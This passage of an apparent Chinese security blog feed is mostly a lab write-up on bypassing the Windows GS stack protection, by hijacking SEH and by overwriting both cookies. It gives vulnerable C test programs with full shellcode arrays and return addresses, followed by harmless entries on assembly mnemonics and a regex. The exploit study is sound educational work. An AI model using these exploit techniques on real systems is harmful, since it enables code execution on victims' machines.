src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220503233229764.png" alt="image-20220503233229764"></p><h1 id="攻击异常处理突破-gs"><a class="markdownIt-Anchor" href="#攻击异常处理突破-gs"></a> 攻击异常处理突破 GS</h1><p>GS 机制并没有对 S.E.H 提供保护，换句话说我们可以通过攻击程序的异常处理达到绕过GS 的目的。</p><p>**思路：**首先用超长字符串覆盖掉异常处理函数指针，让它指向shellcode，然后想办法触发一个异常，程序就会转入shellcode，那么我们就可以通过劫持 S.E.H 来控制程序的后续流程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdafx.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">charshellcode[]=</span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xA0\xFE\x12\x00&quot;</span><span class="comment">//address of shellcode</span></span><br><span class="line">;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buf,input);</span><br><span class="line">    <span class="built_in">strcat</span>(buf,input);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">test(shellcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对代码简要解释如下：<br>（1）函数 test 中存在典型的栈溢出漏洞 strcpy 。<br>（2）在 strcpy 操作后变量 buf 会被溢出，当字符串足够长的时候程序的 S.E.H 异常处理句柄也会被淹没。<br>（3）由于 strcpy 的溢出，覆盖了 input 的地址，会造成 strcat 从一个非法地址读取数据，这时会触发异常，程序转入异常处理，这样就可以在程序检查 Security Cookie 前将程序流程劫持。</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows 2000 SP4</td><td></td></tr><tr><td>编译器</td><td>Visual Studio 2005</td><td>Windows 2000 最高支持 VS2005</td></tr><tr><td>编译选项</td><td>禁用优化选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td></td></tr></tbody></table><blockquote><p>说明：为了不受 SafeSEH 的影响，本次实验需要在 Windows 2000 上进行。此外， shellcode 的起始址可能需要在调试中重新确定。</p></blockquote><p><img src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220504220017173.png" alt="image-20220504220017173"></p><h2 id="找出shellcode和seh的位置"><a class="markdownIt-Anchor" href="#找出shellcode和seh的位置"></a> 找出shellcode和S.E.H的位置</h2><p>先用一段正常长度用 x90 填充的 shellcode，通过 x90 找出栈帧中shellcode和S.E.H的位置。</p><p>shellcode的位置：0012FEB0<br><img src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220504230718803.png" alt="image-20220504230718803"></p><p>最近的S.E.H的位置：0012FFB0+4，因为S.E.H被链入了双向循环链表，所以有两个指针<br><img src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220504231535857.png" alt="image-20220504231535857"></p><p>所以最后shellcode的组成内容为：<br><img src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220505002556837.png" alt="image-20220505002556837"></p><p>我这里编译时，由于运行库kernel32.dll缺少IsWow64Process，导致无法执行。<br><img src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220505002801083.png" alt="image-20220505002801083"></p><p>原本应该会弹出 failwest 对话框。</p><h1 id="同时替换栈和data-中的-cookie-突破-gs"><a class="markdownIt-Anchor" href="#同时替换栈和data-中的-cookie-突破-gs"></a> 同时替换栈和.data 中的 Cookie 突破 GS</h1><p>**思路：**既然Security  Check Cookie 是同时检查.data和栈中的 Cookie是否一致，那我们只要保证溢出后栈中的 Cookie 与.data中的一致，就让验证成功。</p><ul><li>猜测 Cookie 的值。</li><li>同时替换栈中和 .data 中的 Cookie。</li></ul><p>因为Cookie的生成具有很强的随机性，所以猜测几乎不可能，就<strong>只能替换</strong>了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdafx.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">charShellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span><span class="comment">//new value of cookie in .data</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xF4\x6F\x82\x90&quot;</span><span class="comment">//result of \x90\x90\x90\x90 xor ESP</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x94\xFE\x12\x00&quot;</span><span class="comment">//address of Shellcode</span></span><br><span class="line">    ;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * s, <span class="type">int</span> i, <span class="type">char</span> * src)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> dest[<span class="number">200</span>];</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">0x9995</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> * buf=s+i;</span><br><span class="line">        *buf=*src;</span><br><span class="line">        *(buf+<span class="number">1</span>)=*(src+<span class="number">1</span>);</span><br><span class="line">        *(buf+<span class="number">2</span>)=*(src+<span class="number">2</span>);</span><br><span class="line">        *(buf+<span class="number">3</span>)=*(src+<span class="number">3</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(dest,src);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> * str=(<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10000</span>);</span><br><span class="line">    test(str,<span class="number">0xffff2fb8</span>,Shellcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对代码简要解释如下。<br>（1） main 函数中在堆中申请了 0x10000 个字节的空间，并通过 test 函数对其空间的内容进行操作。<br>（2） test 函数对 s+i 到 s+i+3 的内存进行赋值，虽然函数对 i 进行了上限判断，但是没有判断 i 是否大于 0，当 i 为负值时， s+i 所指向的空间就会脱离 main 中申请的空间，进而有可能会指向.data 区域。<br>（3） test 函数中的 strcpy 存在典型的溢出漏洞。</p><p>表 10-5-1 实验环境</p><table><thead><tr><th></th><th>推荐使用的环境</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows XP SP3</td></tr><tr><td>编译器</td><td>Visual Studio 2008</td></tr><tr><td>编译选项</td><td>禁用优化选项</td></tr><tr><td>build 版本</td><td>release 版本</td></tr></tbody></table><blockquote><p>说明： shellcode 的起始地址和异或时使用的 EBP 可能需要在调试中重新确定。</p></blockquote><h2 id="security-cookie-校验的详细过程"><a class="markdownIt-Anchor" href="#security-cookie-校验的详细过程"></a> Security Cookie 校验的详细过程</h2><p>将 shellcode 赋值为 8 个 0x90，然后用OD加载程序。</p><p>**生成Security Cookie过程：**程序从 0x00403000 处取出 Cookie 值，然后与 EBP 异或，最后将异或后的值放到 EBP-0x4 的位置，作为此函数的 Security Cookie。<br><img src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220505232642259.png" alt="image-20220505232642259"></p><p>**函数返回前的校验过程：**是生成Security Cookie的逆过程，程序从 EBP-0x4 的位置取出值，然后与 EBP 异或，最后与 0x00403000 处的 Cookie 比较，相等，则通过校验，否则转入校验失败的异常处理。<br><img src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220505232843263.png" alt="image-20220505232843263"></p><p>本实验的<strong>关键点</strong>是：<br>（1）在 0x00403000 处写入我们自己的数据。我们向 test() 中的 i 传入一个负值，让 str 移动到 0x00403000，从而修改 .data 中的Cookie。<br>（2）向栈中的 Security Cookie 写入相应的数据。我们用 dest 字符串申请了 200个字节的空间，可以通过溢出 dest 将栈中的 Security Cookie 修改为 90909090 与当前 EBP 异或的结果。</p><p>经调试发现，dest的起始位置在 0012FE90，Security Cookie 位于 0012FF60（=EBP-0x4)，EBP 位于0x0012FF64。</p><h2 id="布置-shellcode-计算-i-的值"><a class="markdownIt-Anchor" href="#布置-shellcode-计算-i-的值"></a> 布置 shellcode ，计算 i 的值</h2><p>malloc 申请的空间起始位置为 0x00410048 （将程序中断在 malloc 之后就能看到），这个位置相对于 0x00403000 处于高址位置，通过计算，应将 i 设置为 0xffff2fb8。<br><img src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220505232308904.png" alt="image-20220505232308904"></p><p>shellcode 的长度为 216 个字节，组成如下：<br><img src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220505205054247.png" alt="image-20220505205054247"></p><p>运行结果：<br><img src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220505191823133.png" alt="image-20220505191823133"></p><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><p>以上介绍了几种绕过 GS 的典型方法：</p><ul><li>利用未被保护的内存突破 GS</li><li>覆盖虚函数绕过 GS</li><li>攻击异常处理程序突破 GS</li><li>同时替换 栈和.data 中的Cookie 突破 GS</li></ul><p>GS未能完全消灭溢出，但是它使得溢出条件变得异常苛刻。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;gs-安全编译选项的保护原理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#gs-安全编译选项的保护原理&quot;&gt;&lt;/a&gt; GS 安全编译选项的保护原理&lt;/h1&gt;
&lt;h2 id=&quot;实现版本&quot;&gt;&lt;a class=&quot;markdownIt-Anch</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="栈的保护机制：GS" scheme="https://www.rgzzplus.com/tags/%E6%A0%88%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%EF%BC%9AGS/"/>
    
  </entry>
  
  <entry>
    <title>汇编指令巧记</title>
    <link href="https://www.rgzzplus.com/2022/05/06/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%B7%A7%E8%AE%B0/"/>
    <id>https://www.rgzzplus.com/2022/05/06/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%B7%A7%E8%AE%B0/</id>
    <published>2022-05-05T16:10:28.000Z</published>
    <updated>2022-05-05T16:29:05.404Z</updated>
    
    <content type="html"><![CDATA[<h1 id="寄存器全称"><a class="markdownIt-Anchor" href="#寄存器全称"></a> 寄存器全称</h1><p>AH&amp;AL＝<code>AX</code>(accumulator)：累加寄存器</p><p>BH&amp;BL＝<code>BX</code>(base)：基址寄存器</p><p>CH&amp;CL＝<code>CX</code>(count)：计数寄存器</p><p>DH&amp;DL＝<code>DX</code>(data)：数据寄存器</p><p><code>SP</code>（Stack Pointer）：堆栈指针寄存器</p><p><code>BP</code>（Base Pointer）：基址指针寄存器</p><p><code>SI</code>（Source Index）：源变址寄存器</p><p><code>DI</code>（Destination Index）：目的变址寄存器</p><p><code>IP</code>（Instruction Pointer）：指令指针寄存器</p><p><code>CS</code>（Code Segment）代码段寄存器</p><p><code>DS</code>（Data Segment）：数据段寄存器</p><p><code>SS</code>（Stack Segment）：堆栈段寄存器</p><p><code>ES</code>（Extra Segment）：附加段寄存器</p><p><code>OF</code> overflow flag 溢出标志 操作数超出机器能表示的范围表示溢出,溢出时为1.</p><p><code>SF</code> sign Flag 符号标志 记录运算结果的符号,结果负时为1.</p><p><code>ZF</code> zero flag 零标志 运算结果等于0时为1,否则为0.</p><p><code>CF</code> carry flag 进位标志 最高有效位产生进位时为1,否则为0.</p><p><code>AF</code> auxiliary carry flag 辅助进位标志 运算时,第3位向第4位产生进位时为1,否则为0.</p><p><code>PF</code> parity flag 奇偶标志 运算结果操作数位为1的个数为偶数个时为1,否则为0.</p><p><code>DF</code> direcion flag 方向标志 用于串处理.DF=1时,每次操作后使SI和DI减小.DF=0时则增大.</p><p><code>IF</code> interrupt flag 中断标志 IF=1时,允许CPU响应可屏蔽中断,否则关闭中断.</p><p><code>TF</code> trap flag 陷阱标志 用于调试单步操作.</p><h1 id="指令全称"><a class="markdownIt-Anchor" href="#指令全称"></a> 指令全称</h1><h3 id="1-通用数据传送指令"><a class="markdownIt-Anchor" href="#1-通用数据传送指令"></a> 1、通用数据传送指令</h3><p>MOV—-&gt; move<br>MOVSX—-&gt;extended move with sign data<br>MOVZX—-&gt;extended move with zero data<br>PUSH—-&gt;push<br>POP—-&gt;pop<br>PUSHA—-&gt;push all<br>POPA—-&gt;pop all<br>PUSHAD—-&gt;push all data<br>POPAD—-&gt;pop all data<br>BSWAP—-&gt;byte swap<br>XCHG—-&gt;exchange<br>CMPXCHG—-&gt;compare and change<br>XADD—-&gt;exchange and add<br>XLAT—-&gt;translate</p><h3 id="2-输入输出端口传送指令"><a class="markdownIt-Anchor" href="#2-输入输出端口传送指令"></a> 2、输入输出端口传送指令</h3><p>IN—-&gt;input<br>OUT—-&gt;output</p><h3 id="3-目的地址传送指令"><a class="markdownIt-Anchor" href="#3-目的地址传送指令"></a> 3、目的地址传送指令</h3><p>LEA—-&gt;load effective address，加载有效的地址<br>LDS—-&gt;load DS 加载数据段<br>LES—-&gt;load ES 加载附加段<br>LFS—-&gt;load FS 加载标记段<br>LGS—-&gt;load GS 加载全局段<br>LSS—-&gt;load SS 加载堆栈段</p><h3 id="4-标志传送指令"><a class="markdownIt-Anchor" href="#4-标志传送指令"></a> 4、标志传送指令</h3><p>LAHF—-&gt;load AH from flag<br>SAHF—-&gt;save AH to flag<br>PUSHF—-&gt;push flag<br>POPF—-&gt;pop flag<br>PUSHD—-&gt;push dflag<br>POPD—-&gt;pop dflag</p><h2 id="二-算术运算指令"><a class="markdownIt-Anchor" href="#二-算术运算指令"></a> 二、算术运算指令</h2><p>ADD—-&gt;add<br>ADC—-&gt;add with carry<br>INC—-&gt;increase 1<br>AAA—-&gt;ascii add with adjust<br>DAA—-&gt;decimal add with adjust<br>SUB—-&gt;substract<br>SBB—-&gt;substract with borrow<br>DEC—-&gt;decrease 1<br>NEC—-&gt;negative<br>CMP—-&gt;compare<br>AAS—-&gt;ascii adjust on substract<br>DAS—-&gt;decimal adjust on substract<br>MUL—-&gt;multiplication<br>IMUL—-&gt;integer multiplication<br>AAM—-&gt;ascii adjust on multiplication<br>DIV—-&gt;divide<br>IDIV—-&gt;integer divide<br>AAD—-&gt;ascii adjust on divide<br>CBW—-&gt;change byte to word<br>CWD—-&gt;change word to double word<br>CWDE—-&gt;change word to double word with sign to EAX<br>CDQ—-&gt;change double word to quadrate word</p><h2 id="三-逻辑运算指令"><a class="markdownIt-Anchor" href="#三-逻辑运算指令"></a> 三、逻辑运算指令</h2><p>AND—-&gt;and<br>OR—-&gt;or<br>XOR—-&gt;xor<br>NOT—-&gt;not<br>TEST—-&gt;test<br>SHL—-&gt;shift left<br>SAL—-&gt;arithmatic shift left<br>SHR—-&gt;shift right<br>SAR—-&gt;arithmatic shift right<br>ROL—-&gt;rotate left<br>ROR—-&gt;rotate right<br>RCL—-&gt;rotate left with carry<br>RCR—-&gt;rotate right with carry</p><h2 id="四-串指令"><a class="markdownIt-Anchor" href="#四-串指令"></a> 四、串指令</h2><p>MOVS—-&gt;move string<br>CMPS—-&gt;compare string<br>SCAS—-&gt;scan string<br>LODS—-&gt;load string<br>STOS—-&gt;store string<br>REP—-&gt;repeat<br>REPE—-&gt;repeat when equal<br>REPZ—-&gt;repeat when zero flag<br>REPNE—-&gt;repeat when not equal<br>REPNZ—-&gt;repeat when zero flag<br>REPC—-&gt;repeat when carry flag<br>REPNC—-&gt;repeat when not carry flag</p><h2 id="五-程序转移指令"><a class="markdownIt-Anchor" href="#五-程序转移指令"></a> 五、程序转移指令</h2><h3 id="1无条件转移指令长转移"><a class="markdownIt-Anchor" href="#1无条件转移指令长转移"></a> 1&gt;无条件转移指令(长转移)</h3><p>JMP—-&gt;jump<br>CALL—-&gt;call<br>RET—-&gt;return<br>RETF—-&gt;return far</p><h3 id="2条件转移指令短转移-128到127的距离内"><a class="markdownIt-Anchor" href="#2条件转移指令短转移-128到127的距离内"></a> 2&gt;条件转移指令(短转移,-128到+127的距离内)</h3><p>JAE—-&gt;jump when above or equal<br>JNB—-&gt;jump when not below<br>JB—-&gt;jump when below<br>JNAE—-&gt;jump when not above or equal<br>JBE—-&gt;jump when below or equal<br>JNA—-&gt;jump when not above<br>JG—-&gt;jump when greater<br>JNLE—-&gt;jump when not less or equal<br>JGE—-&gt;jump when greater or equal<br>JNL—-&gt;jump when not less<br>JL—-&gt;jump when less<br>JNGE—-&gt;jump when not greater or equal<br>JLE—-&gt;jump when less or equal<br>JNG—-&gt;jump when not greater<br>JE—-&gt;jump when equal<br>JZ—-&gt;jump when has zero flag<br>JNE—-&gt;jump when not equal<br>JNZ—-&gt;jump when not has zero flag<br>JC—-&gt;jump when has carry flag<br>JNC—-&gt;jump when not has carry flag<br>JNO—-&gt;jump when not has overflow flag<br>JNP—-&gt;jump when not has parity flag<br>JPO—-&gt;jump when parity flag is odd<br>JNS—-&gt;jump when not has sign flag<br>JO—-&gt;jump when has overflow flag<br>JP—-&gt;jump when has parity flag<br>JPE—-&gt;jump when parity flag is even<br>JS—-&gt;jump when has sign flag</p><h3 id="3循环控制指令短转移"><a class="markdownIt-Anchor" href="#3循环控制指令短转移"></a> 3&gt;循环控制指令(短转移)</h3><p>LOOP—-&gt;loop<br>LOOPE—-&gt;loop equal<br>LOOPZ—-&gt;loop zero<br>LOOPNE—-&gt;loop not equal<br>LOOPNZ—-&gt;loop not zero<br>JCXZ—-&gt;jump when CX is zero<br>JECXZ—-&gt;jump when ECX is zero</p><h3 id="4中断指令"><a class="markdownIt-Anchor" href="#4中断指令"></a> 4&gt;中断指令</h3><p>INT—-&gt;interrupt<br>INTO—-&gt;overflow interrupt<br>IRET—-&gt;interrupt return</p><h3 id="5处理器控制指令"><a class="markdownIt-Anchor" href="#5处理器控制指令"></a> 5&gt;处理器控制指令</h3><p>HLT—-&gt;halt<br>WAIT—-&gt;wait<br>ESC—-&gt;escape<br>LOCK—-&gt;lock<br>NOP—-&gt;no operation<br>STC—-&gt;set carry<br>CLC—-&gt;clear carry<br>CMC—-&gt;carry make change<br>STD—-&gt;set direction<br>CLD—-&gt;clear direction<br>STI—-&gt;set interrupt<br>CLI—-&gt;clear interrupt</p><h2 id="六-伪指令"><a class="markdownIt-Anchor" href="#六-伪指令"></a> 六、伪指令</h2><p>DW—-&gt;definw word<br>PROC—-&gt;procedure<br>ENDP—-&gt;end of procedure<br>SEGMENT—-&gt;segment<br>ASSUME—-&gt;assume<br>ENDS—-&gt;end segment<br>END—-&gt;end</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;寄存器全称&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#寄存器全称&quot;&gt;&lt;/a&gt; 寄存器全称&lt;/h1&gt;
&lt;p&gt;AH&amp;amp;AL＝&lt;code&gt;AX&lt;/code&gt;(accumulator)：累加寄存器&lt;/p&gt;
&lt;p&gt;BH&amp;amp;BL＝&lt;</summary>
      
    
    
    
    <category term="经验交流" scheme="https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"/>
    
    
    <category term="汇编指令" scheme="https://www.rgzzplus.com/tags/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://www.rgzzplus.com/2022/05/06/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>https://www.rgzzplus.com/2022/05/06/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</id>
    <published>2022-05-05T16:09:53.000Z</published>
    <updated>2022-05-05T16:14:23.601Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2022/05/06/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220305224352594.png" alt="image-20220305224352594"></p><p><img src="/2022/05/06/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220305224903048.png" alt="image-20220305224903048"></p><blockquote><p>匹配IP：<br>\b((25[0-5]|2[0-4]\d|[01]?\d\d?).){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)\b</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2022/05/06/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220305224352594.png&quot; alt=&quot;image-20220305224352594&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;i</summary>
      
    
    
    
    <category term="工具" scheme="https://www.rgzzplus.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="正则表达式" scheme="https://www.rgzzplus.com/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>其它类型的软件漏洞</title>
    <link href="https://www.rgzzplus.com/2022/05/06/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.rgzzplus.com/2022/05/06/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-05-05T16:09:34.000Z</published>
    <updated>2022-05-05T16:22:54.753Z</updated>
    
    <content type="html"><![CDATA[<h1 id="格式化漏洞"><a class="markdownIt-Anchor" href="#格式化漏洞"></a> 格式化漏洞</h1><h2 id="printf-中的缺陷"><a class="markdownIt-Anchor" href="#printf-中的缺陷"></a> printf 中的缺陷</h2><p>printf 的参数：格式控制符和待输出的数据列表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a=<span class="number">44</span>,b=<span class="number">77</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a=%d,b=%d\n&quot;</span>,a,b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a=%d,b=%d\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于上述的代码，第二个 printf 